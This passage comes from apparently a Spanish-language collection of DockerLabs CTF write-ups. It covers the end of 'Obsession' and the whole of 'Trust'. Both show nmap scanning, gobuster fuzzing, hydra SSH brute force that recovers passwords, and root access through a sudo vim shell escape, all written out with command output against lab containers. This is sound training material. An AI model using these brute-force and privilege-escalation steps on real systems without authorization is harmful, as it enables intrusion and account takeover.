pendientes.txt\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n   1   \u2502 1 Comprar el Voucher de la certificaci\u00f3n eJPTv2 cuanto antes!\n   2   \u2502 \n   3   \u2502 2 Aumentar el precio de mis asesor\u00edas online en la Web!\n   4   \u2502 \n   5   \u2502 3 Terminar mi laboratorio vulnerable para la plataforma Dockerlabs!\n   6   \u2502 \n   7   \u2502 4 Cambiar algunas configuraciones de mi equipo, creo que tengo ciertos\n   8   \u2502   permisos habilitados que no son del todo seguros..\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n</code></pre> <p>As\u00ed que mientras dejamos haciendo un ataque de fuerza bruta al puerto SSH para ambos usuarios con hydra, podemos ir investigando la web para ver si podemos obtener mas informaci\u00f3n. Mientras investigamos la red, vemos que el usuario principal es Russoski, de manera que cuando acaba y encuentra la contrase\u00f1a, paramos el otro ataque de fuerza bruta y hacemos login por SSH.</p> <pre><code>\u276f hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://obsession\nHydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-19 10:48:57\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task\n[DATA] attacking ssh://obsession:22/\n[22][ssh] host: obsession   login: russoski   password: iloveme\n1 of 1 target successfully completed, 1 valid password found\n[WARNING] Writing restore file because 5 final worker threads did not complete until end.\n[ERROR] 5 targets did not resolve or could not be connected\n[ERROR] 0 target did not complete\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-19 10:49:34\n</code></pre> <p>As\u00ed que hacemos login a russoski@obsession con la contrase\u00f1a iloveme</p> <pre><code>\u276f ssh russoski@obsession\nrussoski@obsession's password: \nWelcome to Ubuntu 24.04 LTS (GNU/Linux 6.12.25-amd64 x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/pro\n\nThis system has been minimized by removing packages and content that are\nnot required on a system that users do not log into.\n\nTo restore this content, you can run the 'unminimize' command.\nLast login: Tue Jun 18 04:38:10 2024 from 172.17.0.1\nrussoski@c1489df97f06:~$\n</code></pre>"},{"location":"es/writeups/Obsession/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<p>Una vez dentro, para mayor comodidad con la terminal, realizamos el tratamiento de la tty</p> <pre><code>script /dev/null -c bash\nstty raw -echo; fg\nreset xterm\nexport TERM=xterm\n</code></pre> <p>Ahora, ejecutamos el comando <code>sudo -l</code> para listar los comandos que podemos ejectuar como sudo, y vemos que es el comando vim, de manera que escalamos privilegios abusando de el y dandonos una terminal como root.</p> <pre><code>russoski@c1489df97f06:~$ sudo -l\nMatching Defaults entries for russoski on c1489df97f06:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser russoski may run the following commands on c1489df97f06:\n    (root) NOPASSWD: /usr/bin/vim\nrussoski@c1489df97f06:~$ sudo vim -c ':!/bin/bash'\n\nroot@c1489df97f06:/home/russoski# whoami\nroot\nroot@c1489df97f06:/home/russoski# \n</code></pre> <p>Y ya somos el usuario root!</p>"},{"location":"es/writeups/Obsession/#lecciones-vistas","title":"Lecciones vistas","text":"<ol> <li>Escaneos con nmap</li> <li>Login anonymous en el puerto FTP</li> <li>Ataque de fuerza bruta con hydra</li> <li>Escalada de privilegios con vim</li> </ol>"},{"location":"es/writeups/Trust/","title":"Write Up Trust","text":"<p>Dificultad: Super f\u00e1cil Enlace a dockerlabs: https://dockerlabs.es/</p>"},{"location":"es/writeups/Trust/#configuracion-del-entorno","title":"Configuraci\u00f3n del entorno","text":"<p>Primero de todo desplegamos la m\u00e1quina mediante el script que viene al descargar la m\u00e1quina</p> <pre><code>\u276f sudo ./auto_deploy.sh trust.tar\n[sudo] contrase\u00f1a para godack: \n\n                       ##        .         \n                 ## ## ##       ==         \n              ## ## ## ##      ===         \n          /\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\\___/ ===       \n     ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~\n          \\______ o          __/           \n            \\    \\        __/            \n             \\____\\______/               \n\n  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ \n  |  \\ |  | |    |_/  |___ |__/ |    |__| |__] [__  \n  |__/ |__| |___ | \\_ |___ |  \\ |___ |  | |__] ___] \n\n\n\nEstamos desplegando la m\u00e1quina vulnerable, espere un momento.\n\nM\u00e1quina desplegada, su direcci\u00f3n IP es -\u2192 172.18.0.2\n\nPresiona Ctrl+C cuando termines con la m\u00e1quina para eliminarla\n</code></pre> <p>Una vez desplegada, creamos la carpeta injection, nos metemos dentro y usamos la utilidad mkt que nos crea las carpetas nmap, content, exploits y scripts.</p> <pre><code>\u276f mkdir trust-dockerlabs\n\u276f cd trust-dockerlabs\n\u276f mkt\n\u276f ls -l\ndrwxrwxr-x godack godack 4.0 KB Sun Aug 17 10:41:42 2025 \uf0c7 content\ndrwxrwxr-x godack godack 4.0 KB Sun Aug 17 10:41:42 2025 \uf115 exploits\ndrwxrwxr-x godack godack 4.0 KB Sun Aug 17 10:41:42 2025 \uf115 nmap\ndrwxrwxr-x godack godack 4.0 KB Sun Aug 17 10:41:42 2025 \uf489 scripts\n</code></pre>"},{"location":"es/writeups/Trust/#reconocimiento","title":"Reconocimiento","text":"<p>Una vez conocemos la direcci\u00f3n ip, realizamos un escaneo general para descubrir los puertos abiertos de una forma sigilosa y r\u00e1pida.</p> <pre><code>\u276f nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.18.0.2 -oG allPorts\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-17 10:46 CEST\nInitiating ARP Ping Scan at 10:46\nScanning 172.18.0.2 [1 port]\nCompleted ARP Ping Scan at 10:46, 0.10s elapsed (1 total hosts)\nInitiating SYN Stealth Scan at 10:46\nScanning 172.18.0.2 [65535 ports]\nDiscovered open port 80/tcp on 172.18.0.2\nDiscovered open port 22/tcp on 172.18.0.2\nCompleted SYN Stealth Scan at 10:46, 2.88s elapsed (65535 total ports)\nNmap scan report for 172.18.0.2\nHost is up, received arp-response (0.000024s latency).\nScanned at 2025-08-17 10:46:09 CEST for 2s\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE REASON\n22/tcp open  ssh     syn-ack ttl 64\n80/tcp open  http    syn-ack ttl 64\n</code></pre> <p>As\u00ed descubrimos que los puertos abiertos son el puerto ssh (puerto 22) y el puerto http (puerto 80). De esta manera, con la utilidad extract ports los copiamos en el clipboard y realizamos un reconocimiento de los puertos mas exhaustivo, para descubrir el servicio que se est\u00e1 corriendo en dichos puertos y sus respectivas versiones</p> <pre><code>\u276f extractPorts allPorts\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n       \u2502 File: extractPorts.tmp\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n   1   \u2502 \n   2   \u2502 [*] Extracting information...\n   3   \u2502 \n   4   \u2502     [*] IP Address: 172.18.0.2\n   5   \u2502     [*] Open ports: 22,80\n   6   \u2502 \n   7   \u2502 [*] Ports copied to clipboard\n   8   \u2502 \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u276f nmap -sCV -p22,80 172.18.0.2 -oN targeted\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-17 10:49 CEST\nNmap scan report for 172.18.0.2\nHost is up (0.000058s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)\n| ssh-hostkey: \n|   256 19:a1:1a:42:fa:3a:9d:9a:0f:ea:91:7f:7e:db:a3:c7 (ECDSA)\n|_  256 a6:fd:cf:45:a6:95:05:2c:58:10:73:8d:39:57:2b:ff (ED25519)\n80/tcp open  http    Apache httpd 2.4.57 ((Debian))\n|_http-title: Apache2 Debian Default Page: It works\n|_http-server-header: Apache/2.4.57 (Debian)\n</code></pre>"},{"location":"es/writeups/Trust/#explotacion","title":"Explotaci\u00f3n","text":"<p>Viendo que est\u00e1 corriendo un servicio web y el servicio ssh, lo primero que haremos ser\u00e1 recolectar informaci\u00f3n de la p\u00e1gina web, para posteriormente acceder por ssh. Para ello a\u00f1adiremos una entrada a nuestro DNS local (/etc/hosts) con el nombre de la m\u00e1quina (trust) y su ip.</p> <pre><code>\u276f sudo vi /etc/hosts\n[sudo] contrase\u00f1a para godack: \n\u276f cat /etc/hosts\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n       \u2502 File: /etc/hosts\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n   1   \u2502 127.0.0.1   localhost\n   2   \u2502 127.0.1.1   kali\n   3   \u2502 \n   4   \u2502 172.18.0.2  trust\n   5   \u2502 \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n</code></pre> <p>Al acceder a la web vemos que es la web por defecto de Apache Server, y que no tiene mucha informaci\u00f3n, por lo que vamos a intentar listar todos los directorios de la web mediante un ataque de fuzzing con gobuster.</p> <pre><code>\u276f gobuster dir -u http://trust/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -t 20 -x html,php,txt,php.bak\n\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://trust/\n[+] Method:                  GET\n[+] Threads:                 20\n[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              html,php,txt,php.bak\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/.php                 (Status: 403) [Size: 270]\n/.html                (Status: 403) [Size: 270]\n/index.html           (Status: 200) [Size: 10701]\n/secret.php           (Status: 200) [Size: 927]\n/.html                (Status: 403) [Size: 270]\n/.php                 (Status: 403) [Size: 270]\n/server-status        (Status: 403) [Size: 270]\n/logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.html (Status: 403) [Size: 270]\n/logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.php.bak (Status: 403) [Size: 270]\nProgress: 6369160 / 6369165 (100.00%)\n===============================================================\nFinished\n===============================================================\n</code></pre> <p>De esta manera vemos un directorio escondido llamado secret, con extension php, que al abrirlo muestra lo siguiente:</p> <pre><code>Hola Mario,\n\nEsta web no se puede hackear.\n</code></pre> <p> As\u00ed que suponemos que un posible usuario puede ser Mario. Como no tenemos mas informaci\u00f3n, lo \u00fanico que podemos hacer (o al menos lo \u00fanico que se me ocurre) es hacer un ataque de fuerza bruta sobre el puerto SSH (puerto 22) mediante hydra, para intentar obtener las credenciales de este posible usuario.</p> <pre><code>\u276f hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://trust\nHydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-18 20:05:43\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task\n[DATA] attacking ssh://trust:22/\n[22][ssh] host: trust   login: mario   password: chocolate\n1 of 1 target successfully completed, 1 valid password found\n[WARNING] Writing restore file because 2 final worker threads did not complete until end.\n[ERROR] 2 targets did not resolve or could not be connected\n[ERROR] 0 target did not complete\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-18 20:05:51\n</code></pre> <p>Y as\u00ed obtenemos la contrase\u00f1a chocolate.</p>"},{"location":"es/writeups/Trust/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<p>Una vez dentro, hacemos el tratamiento de terminal para poder operar con comodidad</p> <pre><code>script /dev/null -c bash\nstty raw -echo; fg\nreset xterm\nexport TERM=xterm\n</code></pre> <p>Y ahora, vemos que est\u00e1 instalado el comando sudo, por lo que vemos que comandos podemos ejecutar como sudo.</p> <pre><code>mario@f29b3bbef1a5:~$ sudo -l\n[sudo] password for mario: \nMatching Defaults entries for mario on f29b3bbef1a5:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser mario may run the following commands on f29b3bbef1a5:\n    (ALL) /usr/bin/vim\n</code></pre> <p>As\u00ed que nos otorgamos una terminal como root y bingo!</p> <pre><code>mario@f29b3bbef1a5:~$ sudo vim -c ':!/bin/bash'\n\nroot@f29b3bbef1a5:/home/mario# whoami\nroot\nroot@f29b3bbef1a5:/home/mario# \n</code></pre>"},{"location":"es/writeups/Trust/#lecciones-vistas","title":"Lecciones vistas","text":"<ol> <li>Escaneos con nmap</li> <li>Fuzzing con gobuster</li> <li>Ataque de fuerza bruta con hydra</li> <li>Escalada de privilegios con vim</li> </ol>"}]}